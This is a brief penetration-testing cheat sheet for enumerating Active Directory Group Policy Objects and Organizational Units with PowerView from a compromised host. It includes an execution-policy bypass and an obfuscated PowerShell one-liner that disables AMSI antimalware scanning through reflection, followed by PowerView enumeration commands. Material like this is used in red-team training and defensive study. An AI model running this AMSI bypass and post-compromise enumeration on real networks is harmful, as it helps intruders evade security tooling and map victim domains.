# GPO and OU Enumeration

## PowerView
Import PowerView to the compromised host and run the following commands


`powershell -ep bypass`

Bypass AMSI with this PowerShell command.

```
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

Import the script

`. .\powerview.ps1`



Group Policy Object and Organziational Units enumeration with PowerView

`Get-DomainGPO`

`Get-DomainGPO | select displayname`

`Get-DomainGPO | select name`

See what GPOs your host has

`hostname`

`Get-DomainGPO -ComputerName <HOSTNAME>`

`Get-DomainGPO -ComputerName web`

`Get-ForestGlobalCatalog`

Check domain's OUs

`Get-DomainOU`
